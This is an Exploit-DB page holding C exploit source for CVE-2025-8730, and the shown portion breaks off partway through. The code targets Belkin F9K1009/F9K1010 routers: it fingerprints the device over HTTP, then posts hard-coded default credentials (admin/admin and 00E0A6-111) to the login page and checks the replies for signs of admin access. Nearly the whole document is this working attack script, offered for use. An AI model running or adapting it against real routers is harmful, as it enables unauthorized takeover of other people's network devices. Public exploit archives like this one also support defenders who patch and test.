---
title: [remote] Belkin F9K1009 F9K1010 2.00.04/2.00.09 - Hard Coded Credentials
url: https://www.exploit-db.com/exploits/52407
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:47:56.966420
---

# [remote] Belkin F9K1009 F9K1010 2.00.04/2.00.09 - Hard Coded Credentials

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Belkin F9K1009 F9K1010 2.00.04/2.00.09 - Hard Coded Credentials

#### EDB-ID:

###### 52407

#### CVE:

###### [2025-8730](https://nvd.nist.gov/vuln/detail/CVE-2025-8730)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
/*
 * Title           : Belkin F9K1009 F9K1010 2.00.04/2.00.09 - Hard Coded Credentials
 * Author       : Byte Reaper
 * CVE          : CVE-2025-8730
 * Description  : Exploit demonstrating an authentication bypass vulnerability
 *                in the web interface of Belkin F9K1009 and F9K1010 routers. The flaw resides
 *                in improper session validation logic, allowing remote attackers to gain
 *                unauthorized access to the administrative panel without supplying valid credentials.
 */

#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include "argparse.h"
#include <stdlib.h>
#include <time.h>
#include <errno.h>
#define FULL 2000
#define LOGIN_POST 1500

const char *nameFileC = NULL;
int verbose = 0;
const char *router = NULL;
const char *cookies = NULL;
int uC = 0;
const char *fullurl = NULL;
int sleepS = 0;
int count = 0;
void exitSyscall()
{
    __asm__ volatile
    (
        "mov $0x3C, %%rax\n\t"
        "xor %%rdi, %%rdi\n\t"
        "syscall\n\t"
        :
        :
        :"rax",
         "rdi"
    );
}
int checkLen(int len, char *buf, size_t bufcap)
{
    if (len < 0 || (size_t)len >= bufcap)
    {
        printf("\e[0;31m[-] Len is Long ! \e[0m\n");
        printf("\e[0;31m[-] Len %d\e[0m\n", len);
        exitSyscall();
        return 1;
    }
    else
    {
        printf("\e[0;34m[+] Len Is Not Long (%d).\e[0m\n",len);
        return 0;

    }
    return 0;
}
struct Mem
{
    char *buffer;
    size_t len;
};

size_t write_cb(void *ptr,
                size_t size,
                size_t nmemb,
                void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        fprintf(stderr, "\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exitSyscall();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
const char *wordLogin[] =
{
    "login_success",
    "Welcome",
    "Dashboard",
    "admin panel",
    "Set-Cookie",
    "Authorization",
    "token",
    "sessionid",
    "redirect",
    "access granted",
    "authenticated",
    "user authenticated",
    "login ok",
    "login complete",
    "login status=success",
    "login=1",
    "auth=1",
    "valid credentials",
    "home.htm",
    "main.htm",
    "index.htm",
    "config.htm",
    "firmware.htm",
    "admin.htm",
    NULL
};
void sleepTime(int sec)
{
    if (sec <= 0)
    {
        fprintf(stderr, "\e[0;31m[-] Value seconds must be > 0 !\e[0m\n");
        exitSyscall();
    }

    struct timespec req, rem;
    req.tv_sec  = (time_t)sec;
    req.tv_nsec = 0;

    printf("\e[0;33m[+] Sleeping for %d seconds...\e[0m\n", sec);

    while (nanosleep(&req, &rem) == -1)
    {
        if (errno == EINTR)
        {

            req = rem;
            continue;
        }
        perror("\e[0;31m[-] Nanosleep failed !\e[0m");
        exitSyscall();
    }

    printf("\e[0;34m[+] Sleep successful.\e[0m\n");
}
void detectDeviceType(const char *routerIp)
{
    printf("\n=================================== [type Device] ===================================\e[0m\n");

    CURL *curl = curl_easy_init();
    if (!curl) exitSyscall();

    struct Mem response = { NULL, 0 };

    char full[FULL];
    int len = snprintf(full, sizeof(full), "http://%s", routerIp);
    if (checkLen(len, full, sizeof(full)))
    {
        exitSyscall();
    }

    curl_easy_setopt(curl, CURLOPT_URL, full);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl,
		CURLOPT_CONNECTTIMEOUT,
		5L);
    if (sleepS)
    {
		sleepTime(sleepS);
    }
    curl_easy_setopt(curl,
		    CURLOPT_TIMEOUT,
		    10L);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK)
    {
        fprintf(stderr, "\e[0;31m[-] curl error: %s\n", curl_easy_strerror(res));
    }

    if (response.buffer)
    {
        if (strstr(response.buffer, "F9K1009"))
        {
        	printf("\e[0;36m[+] Device: Belkin F9K1009\e[0m\n");
        }

        else if (strstr(response.buffer, "F9K1010"))
        {
        	printf("\e[0;36m[+] Device: Belkin F9K1010\e[0m\n");
        }

        else
        {
        	  printf("\e[0;31m[-] Unknown device type\e[0m\n");
        	free(response.buffer);
        }

    }
    else
    {
        printf("\e[0;31m[-] Response Is NULL !\n");
    };
    response.buffer= NULL;
    response.len = 0;
    curl_easy_cleanup(curl);
    printf("=====================================================================================\n");
}

void credentialsRequest(const char *routerIp)
{
	CURL *curl = curl_easy_init();
	if (curl == NULL)
	{
		printf("\e[0;31m[-] Error Create Object CURL !\e[0m\n");
		exitSyscall();
	}
	CURLcode res;

	char full[FULL];
	int nL = 2;
	struct  Mem response;
	response.buffer= NULL;
	response.len = 0;
	for (int l = 0; l <= nL; l++)
	{
		if (curl)
		{
			char full[FULL];
			char post[LOGIN_POST];

			if (fullurl != NULL )
			{

				int lenFull = snprintf(full, sizeof(full), "%s", fullurl);
				if (checkLen(lenFull,full, sizeof(full)) == 1)
				{
					printf("\e[0;31m[-] Len FUll URL (Router IP) Is Long !\e[0m\n");
					printf("\e[0;31m[-] Len : %d\n",lenFull);
					exitSyscall();
				}
				printf("[+] Create FULL URL Successfully.\e[0m\n");
				printf("[+] Default Port Request : %d\e[0m\n", 80);
				printf("[+] FULL URL : %s\n", full);
			}
			else
			{
				int lenI = snprintf(full,
				sizeof(full),
				"http://%s/login.htm",
				routerIp);
				if (checkLen(lenI,full, sizeof(full)) == 1)
				{
					printf("\e[0;31m[-] Len FUll URL (Router IP) Is Long !\e[0m\n");
					printf("\e[0;31m[-] Len : %d\e[0m\n",lenI);
					exitSyscall();
				}
				else
				{
					printf("\e[1;34m[+] Create FULL URL Successfully.\e[0m\n");
					printf("\e[1;34m[+] Target IP %s\e[0m\n", routerIp);
					printf("\e[1;34m[+] Default Port Request : %d\e[0m\n", 80);
					printf("\e[1;34m[+] FULL URL : %s\e[0m\n", full);

				}

			}
			if (l < 2)
			{
			 	//login  admin
				int vA = snprintf(post, sizeof(post),
				    "login_username=admin&login_password=admin");
				if (checkLen(vA,
					post,
					sizeof(post)) == 1)
				{
					printf("\e[0;31m[-] Error Write POST DATA !\e[0m\n");
					printf("\e[0;31m[-] Len (data): %d\e[0m\n",
					vA);
					exitSyscall();
				}
				printf("\e[0;36m[+] Write Successfully POST DATA .\e[0m\n");
				printf("\e[0;36m[%d] Result POST DATA (admin) : \e[0m\n", l);
				printf("\n%s\n", post);
		    	}
		    	else
		    	{
			    	//login 00E0A6-111
				int vE = snprintf(post, sizeof(post),
				    "login_usernam=00E0A6-111&login_password=00E0A6-111");
				if (checkLen(vE,
					post,
					sizeof(post)) == 1)
				{
					printf("\e[0;31m[-] Error Write POST DATA !\e[0m\n");
					printf("\e[0;31m[-] Len (data): %d\n",
					vE);
					e...